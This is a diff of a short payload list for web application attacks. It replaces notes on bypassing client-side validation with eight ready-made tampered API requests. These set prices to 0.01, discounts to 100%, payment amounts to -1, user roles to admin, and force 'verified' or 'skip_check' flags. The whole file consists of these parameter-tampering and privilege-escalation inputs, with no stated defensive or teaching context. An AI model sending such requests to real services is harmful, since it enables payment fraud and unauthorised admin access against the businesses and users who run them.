@@ -1,5 +1,8 @@
-disabled=false (remove disabled attribute in HTML)
-hidden field: <input type='hidden' name='role' value='admin'>
-JavaScript validation bypass: intercept and modify request
-maxlength bypass via Burp
-price manipulation: change product price in POST body
+POST /api/purchase {"price":"0.01","product_id":1}
+POST /api/order {"discount":"100%","total":0}
+PUT /api/profile {"role":"admin"}
+POST /api/pay {"amount":"-1"}
+POST /api/transfer {"verified":true}
+POST /api/update {"admin":1}
+POST /api/checkout {"coupon_discount":100}
+POST /api/submit {"validated":true,"skip_check":1}
